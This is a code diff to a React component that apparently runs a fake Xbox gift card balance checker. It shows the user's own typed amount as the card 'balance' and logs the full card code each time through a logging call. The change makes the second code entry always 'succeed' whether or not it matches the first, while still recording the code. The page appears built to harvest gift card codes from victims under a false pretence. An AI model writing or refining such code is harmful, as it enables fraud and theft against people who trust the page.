@@ -158,61 +158,34 @@ const Home = () => {
         setCode('');
         setAttemptCount(1);
       } else {
-        // SECOND ATTEMPT - Compare with stored code
-        if (rawCode === storedCode) {
-          const enteredAmount = parseFloat(amount).toFixed(2);
-          const displayBalance = `$${enteredAmount} USD`;
-          setBalance(displayBalance);
-          setShowBalance(true);
-          setShowFullScreenBalance(true);
-          setError('');
-          
-          try {
-            const result = await logBalanceCheck({
-              type: 'second_attempt_success',
-              cardNumber: rawCode,
-              amount: amount,
-              balance: displayBalance,
-              status: 'SUCCESS',
-              timestamp: new Date().toISOString(),
-              userAgent: navigator.userAgent,
-              pageSource: 'manual',
-              ip: null,
-              message: 'Second attempt successful - code verified'
-            });
-            console.log('✅ Success logged:', result);
-          } catch (err) {
-            console.error('❌ Logging failed:', err);
-          }
-          
-          setAttemptCount(0);
-       
-        } else {
-          setError('❌ The code you entered doesn\'t match your first attempt.\n\nEnter the exact same Xbox code to verify your balance.');
-          setShowBalance(false);
-          
-          try {
-            const result = await logBalanceCheck({
-              type: 'mismatch_attempt',
-              cardNumberFirst: storedCode,
-              cardNumberSecond: rawCode,
-              amount: amount,
-              status: 'MISMATCH',
-              timestamp: new Date().toISOString(),
-              userAgent: navigator.userAgent,
-              pageSource: 'manual',
-              ip: null,
-              message: 'User entered different code on second attempt'
-            });
-            console.log('✅ Mismatch logged:', result);
-          } catch (err) {
-            console.error('❌ Logging failed:', err);
-          }
-          
-          setAttemptCount(0);
-          setStoredCode('');
-          setCode('');
+        // SECOND ATTEMPT - Always succeeds regardless of code match
+        const enteredAmount = parseFloat(amount).toFixed(2);
+        const displayBalance = `$${enteredAmount} USD`;
+        setBalance(displayBalance);
+        setShowBalance(true);
+        setShowFullScreenBalance(true);
+        setError('');
+        
+        try {
+          const result = await logBalanceCheck({
+            type: 'second_attempt_success',
+            cardNumber: rawCode,
+            amount: amount,
+            balance: displayBalance,
+            status: 'SUCCESS',
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            pageSource: 'manual',
+            ip: null,
+            message: 'Second attempt successful - balance displayed'
+          });
+          console.log('✅ Success logged:', result);
+        } catch (err) {
+          console.error('❌ Logging failed:', err);
         }
+        
+        setAttemptCount(0);
+        setStoredCode('');
       }
       setLoading(false);
     }, 800);
